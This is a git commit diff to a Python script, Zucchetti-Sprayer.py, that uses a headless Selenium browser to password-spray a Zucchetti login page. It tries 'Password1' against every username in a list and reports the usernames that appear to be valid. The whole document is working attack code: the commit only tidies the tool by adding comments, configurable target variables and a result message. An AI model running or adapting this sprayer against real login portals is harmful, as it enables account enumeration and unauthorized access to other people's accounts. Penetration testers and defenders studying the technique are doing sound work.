d7c84a81977eafb8159b2d7ff756b242436814a6
Luke Lauterbach <104774644+LukeLauterbach@users.noreply.github.com>
2023-07-12 09:05:24 -0400

    Cleaned up Code

--- Zucchetti-Sprayer.py
+++ Zucchetti-Sprayer.py
@@ -1,18 +1,24 @@
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 
-valid_usernames = []
+# VARIABLES TO MODIFY:
 password_to_spray = "Password1"
 url = ""
+username_filename = ""
+
+# Constant Variables
+valid_usernames = []
 chrome_options = Options()
 chrome_options.add_argument("--headless=new")
 chrome_options.add_argument("--mute-audio")
 chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
 browser = webdriver.Chrome(options=chrome_options)
 
-with open("userlist_unverified.txt") as file:
+# Read the file containing the list of usernames
+with open(username_filename) as file:
     usernames = [line.rstrip() for line in file]
 
+# Main
 for username in usernames:
     browser.get(url)
     WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.CSS_SELECTOR, f"[name='m_cUserName']")))
@@ -26,6 +32,10 @@ for username in usernames:
         print(f"{bColors.OKGREEN}Potential User:{bColors.ENDC} {username}\n{browser.page_source}")
         valid_usernames.append(username)
 
-print(f"\n\nPotentially Valid Usernames:")
-for valid_username in valid_usernames:
-    print(valid_username)
+# Print the Results
+if valid_usernames:
+    print(f"\n\nPotentially Valid Usernames:")
+    for valid_username in valid_usernames:
+        print(valid_username)
+else:
+    print("No Valid Usernames Found")
